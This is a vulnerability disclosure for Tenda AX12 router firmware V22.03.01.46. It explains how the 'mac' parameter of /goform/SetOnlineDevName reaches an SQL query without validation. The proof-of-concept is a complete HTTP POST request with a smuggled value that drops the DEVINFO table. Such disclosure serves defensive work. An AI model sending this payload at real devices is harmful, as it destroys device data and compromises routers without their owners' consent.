# Tenda AX12 Command injection vulnerability

## Firmware information

Firmware download address ：https://www.tenda.com.cn/download/detail-3621.html

## Affected version

Tenda AX12 V22.03.01.46

## Vulnerability details

![image-20231123193219284](https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231123193219284.png)

![img](https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231123164223779.png)

![img](https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231123164413088.png)

![img](https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231123191920751.png)

In the `/goform/SetOnlineDevName` feature, the `mac` parameter is passed to the `update_dev_name` function without validation. The `update_dev_name` function, defined in `libtd_server.so`, then passes this parameter to `db_devinfo_query_name_by_mac`. This parameter is concatenated with an SQL command in `snprintf`, leading to a command injection vulnerability.

## Poc

```http
POST /goform/SetOnlineDevName HTTP/1.1
Host: 192.168.3.2
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/plain, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://192.168.3.2/index.html
Content-Type: application/x-www-form-urlencoded
Content-Length: 54

devName=aaaa&mac=';DROP TABLE DEVINFO;'
```



## Author

E4L4@TalentSec Co.,Ltd